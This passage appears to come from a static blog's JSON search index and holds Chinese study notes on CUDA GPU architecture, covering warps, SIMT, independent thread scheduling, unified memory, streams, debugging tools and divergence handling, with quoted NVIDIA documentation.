<p>\u4e00\u4e2a\u7ebf\u7a0b\u5757\u5185\u7684\u7ebf\u7a0b\u5728\u4e00\u4e2amultiprocessor\u5185\u5e76\u53d1\u6267\u884c\uff0c\u5e76\u4e14\u591a\u4e2a\u7ebf\u7a0b\u5757\u4e5f\u53ef\u4ee5\u5e76\u53d1\u8c03\u5ea6\u5230\u4e00\u4e2aSM\u4e0a\uff08\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u5757\u7ec8\u6b62\u65f6\uff0c\u65b0\u7684\u5757\u8865\u4e0a\uff09 p.s \u8fd9\u91cc\u8bf4\u7684\u662f\u5e76\u53d1\uff0c\u53ef\u80fd\u9700\u8981\u548c\u5e76\u884c\u533a\u5206</p> </li> <li> <p>SM\u88ab\u8bbe\u8ba1\u6765\u5e76\u53d1\u6267\u884c\u4e0a\u767e\u4e2a\u7ebf\u7a0b\uff0c\u91c7\u7528\u4e86SIMT\u67b6\u6784\uff08Single-Instruction, Multiple-Thread\uff09</p> </li> <li>\u5355\u7ebf\u7a0b\u5185\u5229\u7528\u6d41\u6c34\u7ebf\u5b9e\u73b0ILP</li> <li>\u901a\u8fc7\u540c\u65f6\u591a\u7ebf\u7a0b\uff08simultaneous hardware multithreading\uff09\u5b9e\u73b0\u7ebf\u7a0b\u7ea7\u5e76\u884c<ul> <li>\u548cCPU\u7684SMT\u4e0d\u540c\u3002Unlike CPU cores, they are issued in order and there is no branch prediction or speculative execution.</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#simt","title":"SIMT","text":"<p>\u81ea\u5df1\u7684\u7406\u89e3\uff1aCPU\u4e00\u4e2a\u6838\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u4e24\u4e2a\u7ebf\u7a0b\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\uff0c\u800cGPU\u4e00\u4e2aSM\u53ef\u4ee5\u5e76\u53d1\u8fd0\u884c\u6210\u767e\u4e0a\u5343\u7684\u7ebf\u7a0b\u3002\u4e3a\u4e86\u505a\u5230\u8fd9\u70b9\uff0c\u91c7\u7528\u4e86SIMT\u6280\u672f</p> <ul> <li>warp</li> <li> <p>warp\u5185\u7684\u7ebf\u7a0b\u6267\u884c</p> </li> <li> <p>SM\u4ee5\u4e00\u4e2awarp 32\u4e2a\u7ebf\u7a0b\u4e3a\u5355\u4f4d\uff0c\u8fdb\u884c\u8c03\u5ea6\u3002The multiprocessor creates, manages, schedules, and executes threads in groups of 32 parallel threads called\u00a0warps.\u00a0</p> </li> <li>\u6bcf\u4e2awarp\u7684\u7ebf\u7a0b\u4ece\u76f8\u540c\u7684PC\u5f00\u59cb\u6267\u884c\u3002\u4f46\u662f\u5b83\u4eec\u5185\u90e8\u6709\u81ea\u5df1\u7684PC\u53ef\u4ee5\u5355\u72ec\u8df3\u8f6c\u3002Individual threads composing a warp start together at the same program address, but they have their own instruction address counter and register state and are therefore free to branch and execute independently.</li> <li>SM\u5c06\u7ebf\u7a0b\u5757\u5212\u5206\u4e3awarp\u8fdb\u884c\u8c03\u5ea6\u3002When a multiprocessor is given one or more thread blocks to execute, it partitions them into warps and each warp gets scheduled by a\u00a0warp scheduler\u00a0for execution</li> <li>\u7ebf\u7a0b\u5757\u7684\u5212\u5206\u5f88\u7b80\u5355\uff0c\u8fde\u7eed\u7684\u7ebf\u7a0b\u88ab\u5212\u5206\u5728\u4e00\u8d77\u3002The way a block is partitioned into warps is always the same; each warp contains threads of consecutive, increasing thread IDs with the first warp containing thread 0.</li> <li>warp\u4e2d\u7684\u7ebf\u7a0b\u4ece\u76f8\u540c\u5730\u5740\u5f00\u59cb\u6267\u884c\uff0c\u5982\u679c\u7ebf\u7a0b\u56e0\u4e3a\u6570\u636e\u76f8\u5173\u7684\u5206\u652f\u9020\u6210\u5206\u53c9\uff0cwarp\u6267\u884c\u6bcf\u4e00\u6761\u4ee3\u7801\u8def\u5f84\uff0c\u540c\u65f6\u7981\u6b62\u975e\u8be5\u4ee3\u7801\u8def\u5f84\u4e0a\u7684\u7ebf\u7a0b\u3002A warp executes one common instruction at a time. ... If threads of a warp diverge via a data-dependent conditional branch, the warp executes each branch path taken, disabling threads that are not on that path.</li> <li> <p>\u5206\u53c9\u53ea\u53d1\u751f\u5728warp\u5185\uff0c\u4e0d\u540cwarp\u662f\u72ec\u7acb\u7684\u3002Branch divergence occurs only within a warp; different warps execute independently regardless of whether they are executing common or disjoint code paths.</p> </li> <li> <p>GPU\u7684SIMT\u548cSIMD\u6709\u70b9\u7c7b\u4f3c\uff0c\u90fd\u662f\u5355\u6761\u6307\u4ee4\u5904\u7406\u591a\u4e2a\u6570\u636e\u3002The SIMT architecture is akin to SIMD (Single Instruction, Multiple Data) vector organizations in that a single instruction controls multiple processing elements.</p> </li> <li> <p>\u5173\u952e\u7684\u4e0d\u540c\u5728\u4e8e\uff0cSIMT\u65e2\u53ef\u4ee5\u5b9e\u73b0\u7ebf\u7a0b\u7ea7\u5e76\u884c\uff08\u5bf9\u4e8e\u72ec\u7acb\u7684\u6807\u91cf\u7ebf\u7a0b\uff09\uff0c\u53c8\u53ef\u4ee5\u5b9e\u73b0\u6570\u636e\u7ea7\u5e76\u884c\uff08\u5bf9\u4e8e\u5408\u4f5c\u7ebf\u7a0b\uff09\u3002SIMT enables programmers to write thread-level parallel code for independent, scalar threads, as well as data-parallel code for coordinated threads.</p> </li> <li> <p>volta\u4e4b\u524d\u7684\u67b6\u6784\uff0cwarp\u518532\u4e2a\u7ebf\u7a0b\u516c\u7528\u76f8\u540c\u7684PC\u3002\u5bfc\u81f4\u5206\u53c9\u8def\u5f84\u4e0a\u7684\u7ebf\u7a0b\u65e0\u6cd5\u76f8\u4e92\u901a\u4fe1\u3002Prior to NVIDIA Volta, warps used a single program counter shared amongst all 32 threads in the warp together with an active mask specifying the active threads of the warp. As a result, threads from the same warp in divergent regions or different states of execution cannot signal each other or exchange data, and algorithms requiring fine-grained sharing of data guarded by locks or mutexes can easily lead to deadlock, depending on which warp the contending threads come from.</p> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#hardware-multithreading","title":"Hardware Multithreading","text":"<ul> <li>\u6267\u884c\u4e0a\u4e0b\u6587\u5305\u542bPC\uff0c\u5bc4\u5b58\u5668\u3002warp\u4e0a\u4e0b\u6587\u88ab\u4fdd\u5b58\u5728\u7247\u4e0a\uff08\u800c\u4e0d\u662f\u8f6f\u4ef6\u4fdd\u5b58\uff09\uff0c\u56e0\u6b64warp\u5207\u6362\u6ca1\u6709\u635f\u5931\u3002The execution context (program counters, registers, and so on) for each warp processed by a multiprocessor is maintained on-chip during the entire lifetime of the warp. Therefore, switching from one execution context to another has no cost, </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#shared-memory-or-cache-","title":"Shared memory or cache ?","text":"<p>Is it possible to use L1 cache instead of shared memory when implementing blocked matmuls in CUDA - CUDA / CUDA Programming and Performance - NVIDIA Developer Forums</p> <p>\u8d77\u521d\u6ca1\u6709L1/L2 --&gt; \u5f15\u5165scratch pad --&gt; cache\u8d8a\u6765\u8d8a\u5927</p> <p>I think it is fair to say that the importance of shared memory in CUDA programming has decreased with the advent of L1/L2 caches of competitive size in GPUs. For use cases requiring peak performance, shared memory can still be important due to the programmer control it provides.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#tensor-core","title":"tensor core","text":"<p>v100 whitepaper</p> <p>The Volta tensor cores are accessible and exposed as Warp-Level Matrix Operations in the CUDA 9 C++ API. The API exposes specialized matrix load, matrix multiply and accumulate, and matrix store operations to efficiently use Tensor Cores from a CUDA-C++ program. At the CUDA level, the warp-level interface assumes 16x16 size matrices spanning all 32 threads of the warp. In addition to CUDA-C++ interfaces to program Tensor Cores directly, cuBLAS and cuDNN libraries have been updated to provide new library interfaces to make use of Tensor Cores for deep learning applications and frameworks. NVIDIA has worked with many popular deep learning frameworks such as Caffe2 and MXNet to enable use of Tensor Cores for deep learning research on Volta GPU based systems. NVIDIA is working to add support for Tensor Cores in other frameworks as well.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#aaa","title":"aaa","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#unified-memory","title":"unified memory","text":"<p>Beyond GPU Memory Limits with Unified Memory on Pascal | NVIDIA Technical Blog</p> <p>\u80cc\u666f - \u4e24\u4e2amemory space - \u5e94\u7528\u4e0d\u80fdoversubscribing GPU\u5185\u5b58\uff0c\u5f00\u53d1\u8005\u5fc5\u987b\u624b\u52a8\u7ba1\u7406active working set - \u53cc\u3001\u56db\u548c\u516b GPU \u7cfb\u7edf\u5728\u5de5\u4f5c\u7ad9\u548c\u5927\u578b\u8d85\u7ea7\u8ba1\u7b97\u673a\u4e2d\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\uff0c\u5728CPU \u548cGPU \u4e4b\u95f4\u624b\u52a8\u7ba1\u7406\u6570\u636e\u5f88\u56f0\u96be - \u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u57fa\u672c\u65e0\u6cd5\u624b\u52a8\u7ba1\u7406\uff1a\u5149\u7ebf\u8ffd\u8e2a\u5f15\u64ce\u53d1\u5c04\u7684\u5149\u7ebf\u53ef\u4ee5\u6839\u636e\u6750\u6599\u8868\u9762\u5411\u4efb\u4f55\u65b9\u5411\u53cd\u5f39\u3002\u5982\u679c\u573a\u666f\u4e0d\u9002\u5408 GPU \u5185\u5b58\uff0c\u5149\u7ebf\u53ef\u80fd\u5f88\u5bb9\u6613\u51fb\u4e2d\u4e0d\u53ef\u7528\u7684\u8868\u9762\uff0c\u5fc5\u987b\u4ece CPU \u5185\u5b58\u4e2d\u83b7\u53d6\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6ca1\u6709\u771f\u6b63\u7684 GPU \u9875\u9762\u6545\u969c\u529f\u80fd\uff0c\u51e0\u4e4e\u4e0d\u53ef\u80fd\u8ba1\u7b97\u51fa\u54ea\u4e9b\u9875\u9762\u5e94\u8be5\u5728\u4ec0\u4e48\u65f6\u95f4\u8fc1\u79fb\u5230 GPU \u5185\u5b58\u3002</p> <p>\u7279\u70b9 - \u7edf\u4e00\u5185\u5b58\u4e8e 2014 \u5e74\u968f CUDA 6 \u548c Kepler \u67b6\u6784\u4e00\u8d77\u63a8\u51fa\u3002\u8fd9\u79cd\u76f8\u5bf9\u8f83\u65b0\u7684\u7f16\u7a0b\u6a21\u578b\u5141\u8bb8 GPU \u5e94\u7528\u7a0b\u5e8f\u5728 CPU \u51fd\u6570\u548c GPU \u5185\u6838\u4e2d\u4f7f\u7528\u5355\u4e2a\u6307\u9488\uff0c\u4ece\u800c\u5927\u5927\u7b80\u5316\u4e86\u5185\u5b58\u7ba1\u7406\u3002 - CUDA 8 \u548c Pascal \u67b6\u6784\u901a\u8fc7\u6dfb\u52a0 49 \u4f4d\u865a\u62df\u5bfb\u5740\u548c\u6309\u9700\u9875\u9762\u8fc1\u79fb(on-demand page migration)\uff0c\u663e\u8457\u6539\u8fdb\u4e86\u7edf\u4e00\u5185\u5b58\u529f\u80fd\u3002     - \u00a0\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5b9e\u73b0\u4e86page fault\u3002The Page Migration engine allows GPU threads to fault on non-resident memory accesses so the system can migrate pages from anywhere in the system to the GPUs memory on-demand for efficient processing. - CUDA 8 \u8fd8\u6dfb\u52a0\u4e86\u901a\u8fc7\u5411\u8fd0\u884c\u65f6\u63d0\u4f9b\u63d0\u793a\u6765\u4f18\u5316\u6570\u636e\u5c40\u90e8\u6027\u7684\u65b0\u65b9\u6cd5\uff0c\u56e0\u6b64\u4ecd\u7136\u53ef\u4ee5\u5b8c\u5168\u63a7\u5236\u6570\u636e\u8fc1\u79fb\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#memory-space","title":"memory space","text":"<p>local global  co</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda-and-applications-to-task-based-programming","title":"CUDA and Applications to Task-based Programming","text":"<p>CUDA and Applications to Task-based Programming (cuda-tutorial.github.io)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#part1-\u7f16\u7a0b\u6a21\u578b","title":"part1 \u7f16\u7a0b\u6a21\u578b","text":"<ul> <li>CPU latency-oritened<ul> <li>large L1</li> <li>ILP</li> </ul> </li> <li>GPU througput-oriented<ul> <li>vast number of parallel processors</li> <li>over-subscribe, latency hiding</li> </ul> </li> <li>CUDA: Compute Unified Device Architecture<ul> <li>driver API: cu</li> <li>runtime API: cuda</li> <li>device runtime API</li> <li>driver API is superset of runtime API, provide a few additional advanced features.</li> </ul> </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u6709\u7528\u7684\u53c2\u8003\u8d44\u6599","title":"\u6709\u7528\u7684\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Essential reading<ul> <li>CUDA Programming Guide </li> <li>CUDA API Reference Manual </li> <li>PTX Instruction Set Architecture </li> </ul> </li> <li>Building executables<ul> <li>CUDA Compiler Driver NVCC </li> </ul> </li> <li>Debugging &amp; profiling<ul> <li>CUDA-MEMCHECK</li> <li>Nsight Documentatio</li> </ul> </li> </ul> <p><code>__global__</code>: be invoked straight from the host and must not have a return value other than void. - Launch configuration, parameters (built-in types, structs, pointers) <code>__device__</code>: be called from functions already running on the device, such as kernels or other device functions. <code>__host__</code>: \u4fee\u9970\u8fd0\u884c\u5728CPU\u4e0a\u7684\u51fd\u6570 - \u540c\u65f6\u6307\u5b9adevice\u548chost\uff0c\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u4e00\u4e9b\u67b6\u6784\u65e0\u5173\u7684\u51fd\u6570</p> <p>\u540c\u6b65 - kernel call\u5bf9\u4e8ehost\u662f\u5f02\u6b65\u7684\uff0c\u7136\u800ckernel call\u4e4b\u95f4\u9ed8\u8ba4\u4e0d\u662f\u5f02\u6b65\u7684\uff0c\u56e0\u6b64cuda\u9ed8\u8ba4\u5047\u8bbe\u8fde\u7eed\u7684kernel calls or copy instructions are dependent on previous events, and order them accordingly\u3002 - \u540c\u6b65\u547d\u4ee4     - cudaDeviceSynchronize() to synchronize CPU and GPU     - cudaEventSynchronize() to synchronize up to certain event</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<p>\u4f7f\u7528warp\u7684\u539f\u56e0\uff0c\u4e3a\u4e86\u5229\u7528SIMD\u5355\u5143 For the sake of exploiting SIMD hardware units, threads will always execute in groups of 32, regardless of the block size being used.</p> <p>volta\u6539\u8fdb\u4e86warp\uff08\u5355\u72ecPC\uff09 Before Volta: not understanding warps may crash your application  After Volta: not caring about warps may make your application slower</p> <p>SM - cuda core: synonym for the units that perform integer or floating-point arithmetic - LD/ST - SFU - tensor core</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#warp\u6267\u884c\u6a21\u578b","title":"warp\u6267\u884c\u6a21\u578b","text":"<p>block queue - the blocks that make up a grid are committed to the GPU in a block queue. - GPU will then proceed to process the blocks in parallel. The degree of parallelisms depends on the hardware being used but is transparent to the developer: block\u88ab\u5b8c\u5168\u5206\u914d\u7ed9\u4e00\u4e2aSM \u4e00\u4e2aSM\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2ablock - \u5982\u4f55\u8003\u8651shared memory\u7684\u5171\u4eab\uff1f SM\u9009\u62e9ready\u7684warp\u6267\u884c\uff0c - SM\u7684warp\u8d8a\u591a\uff0c\u5e76\u884c\u6548\u7387\u8d8a\u9ad8\uff1fThe more warps an SM has to choose from, the higher the chances are that it can hide latency by switching to different warps.</p> <p>warp\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u6267\u884c\uff0cwarp\u4e2d\u7684\u7ebf\u7a0b\u540c\u65f6\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4 - \u7ebf\u7a0b\u53ef\u4ee5\u5206\u53c9\uff08diverged\uff09</p> <p></p> <p>SIMT\u6b63\u5f0f\u89e3\u91ca\uff1a\u65e2\u53ef\u4ee5\u770b\u4f5c\u5355\u72ec\u7684\u7ebf\u7a0b\uff0c\u53c8\u53ef\u4ee5\u50cfSIMD\u4e00\u6837\u9ad8\u6548\uff08\u53ea\u8981\u4e0d\u5206\u53c9\uff09 - \u6bcf\u4e2a\u7ebf\u7a0b\u6709\u4e00\u4e2aactive flag\u63a7\u5236\u662f\u5426\u53c2\u4e0ewarp\u5185\u7684\u8ba1\u7b97 This architecture design, which enables threads to behave like individual entities, while still enabling the exploitation of efficient SIMD operations when threads are not diverged is described by the term \u201csame-instruction-multiple-threads\u201d, or SIMT for short.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda-thread-execution-model","title":"CUDA thread execution model","text":"<ul> <li>Legacy Thread Scheduling</li> <li>Independent Thread Scheduling (ITS)</li> </ul> <p>legacy(\u201clockstep\u201d) - warp\u53ea\u6709\u4e00\u4e2aPC\u503c     - warp \u4e2d\u7684\u6240\u6709\u7ebf\u7a0b\u5728\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u90fd\u6267\u884c\u76f8\u540c\u7684\u6307\u4ee4 - inactive will not execute current instruction - diverges\u65f6\uff0c\u5148\u6267\u884c\u4e00\u90e8\u5206\uff0c\u518d\u6267\u884c\u53e6\u4e00\u90e8\u5206 - \u5728warp\u5207\u6362\u524d\uff0c\u4f1a\u5c1d\u8bd5\u8fbe\u5230\u5408\u5e76\u70b9\u3002Diverged threads will try to reach convergence point before switching - \u4f4d\u4e8e\u5206\u53c9\u7684\u4e24\u90e8\u5206\u7684\u7ebf\u7a0b\uff0c\u4e0d\u80fd\u5b9e\u73b0\u4e00\u4e9b\u540c\u6b65\u7b97\u6cd5\uff0c\u5bb9\u6613\u9020\u6210\u6b7b\u9501 </p> <p>ITS(Independent Thread Scheduling) - Two registers reserved, each thread gets its own program counter - \u7ebf\u7a0b\u7684\u6267\u884c\u4ecd\u7136\u53d1\u751f\u5728warp\uff0cIt is not possible for threads in a warp to perform different instructions in the same cycle     - \u4e5f\u5c31\u662f\u8bf4\u4ecd\u7136\u65e0\u6cd5\u4e00\u8d77\u6267\u884cA\u548cB - ITS provides a \u201cprogress guarantee\u201d: eventually, over a number of cycles, all individual program counters that the threads in a warp maintain will be visited - they are free to stay diverged until the program finishes. The GPU will try to make threads reconverge at opportune times, - \u901a\u8fc7\u663e\u793a\u7684\u540c\u6b65\u6307\u4ee4\u4fdd\u8bc1\u6240\u6709\u7ebf\u7a0b\u6267\u884c\u76f8\u540c\u7684\u6307\u4ee4\u3002synchronization command</p> <p></p> <p><code>__syncwarp</code> - \u53ea\u5bf9volta\u4e4b\u540e\u7684\u67b6\u6784\u6709\u610f\u4e49\uff08\u652f\u6301ITS\uff09 - \u53ef\u4ee5\u901a\u8fc7mask\u53ea\u540c\u6b65\u4e00\u4e2a\u5b50\u96c6\u7ebf\u7a0b\u300232bit integer, where each bit indicates whether or not a thread with the corresponding ID should participate in the synchronization.</p> <p><code>__syncthreads()</code> - All active threads must reach the same instruction in the program</p> <p><code>this_grid().sync()</code> can busy-wait to synchronize entire kernel</p> <p>\u6b63\u5e38\u6765\u8bf4\uff0cCUDA\u7f16\u7a0b\u8303\u5f0f\uff08programming paradigm\uff09\u5305\u542bgrid-block-thread\u4e09\u5c42\u3002\u4f46\u662f\u7531\u4e8e\u7ebf\u7a0b\u662f\u6309\u7167warp\u8c03\u5ea6\u7684\uff0c\u56e0\u6b64\u6b63\u786e\u5229\u7528warp\u7684\u6027\u8d28\u53ef\u4ee5\u6781\u5927\u63d0\u9ad8\u6027\u80fd\u3002</p> <p>Warp-level primitives are instructions where threads in one warp exploit the fact that they run together to quickly share information</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#reduce\u4f18\u5316\u4f8b\u5b50","title":"reduce\u4f18\u5316\u4f8b\u5b50","text":"<p>1 reduce global - N\u6b21read, store global memory - read\u4f1a\u7ecf\u8fc7cache\uff0c\u90a3\u4e48\u5176\u5b83sm\u8bfb\u53d6\u7684\u65f6\u5019\u4f1a\u53cd\u590d\u51fa\u73b0invalid cache\u7684\u60c5\u51b5\u5417\uff1f </p> <p>2 reduce shared - \u4f7f\u7528shared\u5feb\u901f\u7684\u5185\u5b58\u7d2f\u52a0 - \u5c06\u64cd\u4f5cglobal memory\u964d\u4f4e\u4e3aN/256 </p> <p>\u524d\u9762\u7684\u5747\u662f\u987a\u5e8f\u89c4\u7ea6\uff0c\u53ef\u4ee5\u4f7f\u7528subliner\u7684\u7b97\u6cd5 3  </p> <p>4  - \u4f7f\u7528\u5bc4\u5b58\u5668\u505a\u6700\u540e32\u4e2a\u6570\u636e\u7684\u89c4\u7ea6     - In the first iteration, each thread in the warp will try to read the value of the thread with an ID that is 16 higher than its own. </p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#stream","title":"stream","text":"<p>CUDA will assume that kernels depend on each other unless indicated otherwise.</p> <p>stream - stream\u4e4b\u95f4\u6ca1\u6709\u4f9d\u8d56 - launch\u65f6\u901a\u8fc7\u7b2c4\u4e2a\u53c2\u6570\u6307\u5b9astream\uff0c\u9ed8\u8ba4\u4e3a\u201cnull\u201d stream     - \u8c03\u7528CUDA runtime API\u65f6\uff0c\u4f20\u9012stream\u53c2\u6570\u3002\u5982cudaMemcpyAsync</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#debug","title":"debug","text":"<p>nsight vscode plugin: Nsight Visual Studio Code Edition</p> <ul> <li>Overview reveals warps, active and valid masks of individual threads</li> </ul> <p>cuda-memcheck suit <code>cuda-memcheck \u2013-tool &lt;tool&gt; &lt;application&gt;</code> \u2022 memcheck: memory errors (access violations, leaks, API errors)  \u2022 synccheck: misuse of synchronization (invalid masks, conditions)  \u2022 racecheck: data races (read-after-write, write-after-read hazards)  \u2022 initcheck: evaluation of uninitialized values (global memory only</p> <ul> <li>CUB/Thrust: additional primitives and functions similar to standard library <ul> <li>Algorithms: e.g., prefix sum, scan, sort  \u2022 Data structures and containers: e.g., vectors </li> </ul> </li> <li>cuBLAS: basic linear algebra subprograms (BLAS) on top of CUDA </li> <li>cuFFT: efficient implementation of discrete fourier transform on the GPU </li> <li>cuSparse: algorithms and optimizations for working with sparse matrices </li> <li>TensorRT: interface to learning and inference capabilities with tensor cores </li> <li>CUTLASS: provides a range of templates for tensor core matrix computations</li> </ul> <p>Compiler Explorer (godbolt.org) - \u652f\u6301cuda c++ - \u652f\u6301PTX\u548cSASS</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#part-2-hardware\u5b9e\u73b0","title":"part 2 hardware\u5b9e\u73b0","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<p>host\u548cdevice\u90e8\u5206\u5206\u5f00\u7f16\u8bd1</p> <p>host code - takes care of loading matching GPU binary stored in .exe  - translate kernel<code>&lt;&lt;&lt;\u2026&gt;&gt;&gt;(\u2026)</code> syntax into API call</p> <p>\u201cFat Binary\u201d can contain both  - PTX for various compute capabilities      - allows the binary to target unknown architecture  - precompiled machine code for specific GPU architectures      - optimal performance on certain known devices</p> <p>PTX - \u751f\u6210\u673a\u5668\u7801     - ptxas     - driver at runtime(JIT)</p> <p>SASS(Shader Assembly?) - nvdisasm.exe - \u6ca1\u6709\u6587\u6863</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u786c\u4ef6\u8bbe\u8ba1","title":"\u786c\u4ef6\u8bbe\u8ba1","text":"<ul> <li>GPU\u8bbe\u8ba1\u6210\u6700\u5927\u5316\u541e\u5410\u91cf</li> <li>\u4e0d\u7b49\u5f85\u957f\u5ef6\u8fdf\u64cd\u4f5c\uff0c\u800c\u662f\u5207\u6362\u5230\u5176\u5b83\u4efb\u52a1</li> </ul> <p>\u8bbe\u8ba1\u5bf9\u6bd4 </p> <p>CPU\uff1a\u4f18\u5316single flow\u901f\u5ea6 - larget cache - complex control logic for out-of-order execution</p> <p>GPU - simple control - many core - large register     - keep context resident on chip, enable rapidly switch - rely on SIMD     - Each control logic is associated with multiple arithmetic logic units (ALUs), allowing for the parallel execution of multiple control flows</p> <p>two-level hierarchy that consists of groups of groups of SIMD cores. - GPU     - SM         - warp scheduler             - register file             - a set of ALU: INT32, FP32, FP64, Tensor Core, LD/ST unit, SFU         - shared memory         - L1 cache</p> <p>each warp scheduler is assigned a set of warps to execute - The execution context of all threads that are part of each warp is kept locally in the register file associated with the warp scheduler responsible for the warp</p> <p>Whenever it could issue a new instruction (e.g., each clock cycle unless all of the necessary resources are occupied), the warp scheduler will pick the next instruction from one of its warps that are ready to run (i.e., not waiting on the result of a previous operation) and schedule it to the appropriate hardware unit. - \u5355\u53d1\u5c04\uff1f - \u770b\u6765\u65f6SIMD\u5f62\u5f0f\u53d1\u5c04</p> <p>warp\u5207\u6362\u9690\u85cf\u5ef6\u8fdf\uff0cwarp scheduler\u4ecereay\u7684warp\u4e2d\u9009\u62e9\u4e00\u4e2a\u6267\u884c\u5176\u6307\u4ee4\uff08\u5047\u8bbeSIMD\uff09\uff0c\u9047\u5230\u8bbf\u5b58\u6307\u4ee4\uff0c\u5982\u679c\u4e0b\u4e00\u6761\u6307\u4ee4\u4f9d\u8d56\u8bbf\u5b58\u6307\u4ee4\u6570\u636e\uff0c\u5219\u5c06warp\u7f6e\u4e8esuspend queue\u3002\u7136\u540e\u5207\u6362\u5230\u53e6\u4e00\u4e2aready warp\u3002\u56e0\u6b64\u53ea\u8981\u4e00\u76f4\u80fd\u5207\u6362warp\uff0c\u8bbf\u5b58\u5ef6\u8fdf\u5c31\u53ef\u4ee5\u88ab\u9690\u85cf\u3002</p> <p>So far, we have simply assumed that all threads within a warp always need to run the same instruction next, allowing us to execute all threads of a warp in parallel in SIMD fashion</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#warp\u5b9e\u73b0","title":"warp\u5b9e\u73b0","text":"<p>\u5bf9\u4e8ediverge\u7684\u5904\u7406\uff0c\u5c5e\u4e8e\u731c\u6d4b</p> <p>predication - \u6307\u4ee4\u901a\u8fc71bit prediction\uff0c\u6765\u51b3\u5b9a\u662f\u5426\u6267\u884c - \u7a0b\u5e8f\u4e00\u76f4\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u6709\u4e00\u4e9b\u5206\u652f\u7684EXIT\u6307\u4ee4\u5728pred\u7684\u4f5c\u7528\u4e0b\u751f\u6548\uff0c\u907f\u514d\u6267\u884c\u5176\u5b83\u5206\u652f\u7684\u4ee3\u7801 - \u7f3a\u70b9\uff1a     - However, control flow is forced to pass over all instructions on both sides of every branch         - \u6709\u4e9bbranch\uff0c\u6ca1\u6709\u7ebf\u7a0b\u6267\u884c\u3002\u4ecd\u7136\u8981\u904d\u5386\u6240\u6709path\uff0c\u5bfc\u81f4significant overhead especially as branches are nested more and more deeply - \u5bf9\u4e8e\u66f4\u590d\u6742\u7684\u63a7\u5236\uff0c\u6bd4\u5982\u51fd\u6570\u8c03\u7528\uff0c\u65e0\u6cd5\u5b9e\u73b0</p> <p>\u5148\u6267\u884c\u4e00\u90e8\u5206\uff0c\u518d\u6267\u884c\u53e6\u4e00\u90e8\u5206\uff0c\u6700\u540e\u5408\u5e76\u3002 - \u5982\u4f55\u51b3\u5b9a\u6267\u884c\u987a\u5e8f\u5462\uff1f     - \u987a\u5e8f\u6267\u884c\uff0c\u4fdd\u8bc1\u80fd\u904d\u5386\u5230\u6240\u6709\u5206\u652f - \u66f4\u590d\u6742\u7684\u60c5\u51b5\uff1f     - \u5d4c\u5957\u5faa\u73af     - \u5fc5\u987b\u904d\u5386\u5b8c\u6240\u6709\u5206\u652f\uff08\u5373\u4f7f\u6ca1\u6709\u7ebf\u7a0b\u6267\u884c\uff09     - \u4f7f\u7528CSR\u6808</p> <p></p> <p>CSR(Call, Return, Synchronization) - 